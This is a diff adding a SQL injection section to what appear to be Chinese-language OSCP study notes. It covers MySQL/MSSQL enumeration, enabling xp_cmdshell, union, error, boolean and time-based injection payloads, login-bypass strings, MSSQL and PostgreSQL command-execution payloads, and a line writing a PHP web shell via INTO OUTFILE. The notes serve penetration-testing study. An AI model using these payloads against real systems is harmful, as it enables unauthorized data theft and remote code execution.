@@ -27,6 +27,103 @@ date: 2024-02-07
 
 ### Injection
 #### SQLi
+##### SQL 基本操作
+* MySQL
+    ```bash
+    $ mysql -u root -p'root' -h <SQL server IP> -P 3306 # 連線
+    select version(); # 查版本
+    select system_user(); # 查當前使用者
+    show databases; # 列資料庫
+    use <database_name>; # 使用某個資料庫
+    show tables;
+    SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec'; # 查密碼
+    ```
+* MSSQL
+    ```bash
+    $ impacket-mssqlclient <username>:<password>@<MSSQL IP> -windows-auth # 連線
+    SELECT @@version; # 查版本（同時揭露 Windows Server 版本）
+    SELECT SYSTEM_USER; # 查看當前使用者
+    SELECT name FROM sys.databases; # 列資料庫
+    use <database_name>;
+    SELECT * FROM <database_name>.information_schema.tables; # 查表
+    SELECT * FROM <database_name>.dbo.<table_name>; # 查資料（注意需加 dbo schema）
+
+    # 拿 shell: 前提是 xp_cmdshell 有啟用，設想情境是
+    ## 1. 拿到 MSSQL Cred. 之後
+    ## 2. 進入 MSSQL 修改 show advanced options 啟用 xp_cmdshell
+    EXEC sp_configure 'show advanced options', 1;
+    RECONFIGURE;
+    EXEC sp_configure 'xp_cmdshell', 1;
+    RECONFIGURE;
+    EXEC xp_cmdshell 'whoami';
+    ```
+
+##### SQLi
+* Union-Based: 有兩個前提
+    * 欄位數量要一致
+    * 每一個欄位的 data type 都要和前一個 database 一樣
+
+    ```sql
+    ' ORDER BY 1-- -
+    ' ORDER BY 5-- - # 利用數字判斷 columns 數量有多少，如果使用 5 出現 error 就代表該數量的欄位不存在，那就代表 column 數量只有 4 個
+    ' UNION SELECT NULL,NULL,NULL,NULL-- - # 利用此方式找出每一個欄位的 data type ，如果出錯就把該欄位換成其他的，之後再一個一個換成 str 或 num
+    ' UNION SELECT 1,2,3,4,5-- - 
+    ' UNION SELECT user(),version(),database(),4,5-- -
+    ' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -
+    ' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='users'-- -
+    ' UNION SELECT username,password,3,4,5 FROM users-- -
+
+    # 插入 webshell (MySQL)
+    ## 1. MySQL 使用者有 FILE 權限（能讀寫檔案）
+    ## 2. MySQL 的 secure_file_priv 沒有限制寫入路徑（或設為空）
+    ## 3. 目標路徑（/var/www/html/tmp/）MySQL 進程有寫入權限
+    ## 4. 該檔案不能已存在（INTO OUTFILE 不會覆蓋）
+    ' UNION SELECT 1,"<?php system($_GET['cmd']); ?>",3,4,5 INTO OUTFILE '/var/www/html/tmp/shell.php'-- -
+    ```
+* Error-Based
+    ```sql
+    ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))-- -
+    ' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)-- -
+    ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+    ```
+* Boolean-Based
+    ```sql
+    ' AND 1=1-- -                          -- 真，頁面正常
+    ' AND 1=2-- -                          -- 假，頁面不同
+    ' AND SUBSTRING(database(),1,1)='a'-- -
+    ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='e'-- -
+    ' AND (SELECT LENGTH(database()))=5-- -
+    ' AND ASCII(SUBSTRING(database(),1,1))>100-- -    -- 用二分法加速
+    ' AND ASCII(SUBSTRING(database(),1,1))<120-- -
+    ```
+* Time-Based
+    ```sql
+    ' AND SLEEP(5)-- -                     -- 確認能注入
+    ' AND IF(1=1, SLEEP(5), 0)-- -
+    ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
+    ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100, SLEEP(5), 0)-- -
+    ```
+* 認證繞過
+    ```sql
+    ' OR 1=1-- -
+    ' OR '1'='1
+    admin'-- -
+    ' OR 1=1 LIMIT 1-- -
+    ' OR 1=1#
+    ```
+* MSSQL 專用（OSCP 常見）
+    ```sql
+    ' UNION SELECT 1,2,3-- -
+    '; EXEC xp_cmdshell('whoami')-- -      -- RCE！
+    '; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -  -- 啟用 xp_cmdshell
+    ```
+* PostgreSQL
+    ```sql
+    ' UNION SELECT NULL,NULL,NULL-- -      -- 用 NULL 避免型別問題
+    '; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM 'id';-- -
+    ```
+
+##### 如何使用 SQLMAP
 * [ Day 4 很像走迷宮的sqlmap ](https://ithelp.ithome.com.tw/articles/10202811)
 * [SQLmap 基本使用](https://hackmd.io/@bttea/sqlmap_common_parameters) ← 解釋的非常好
     ```bash
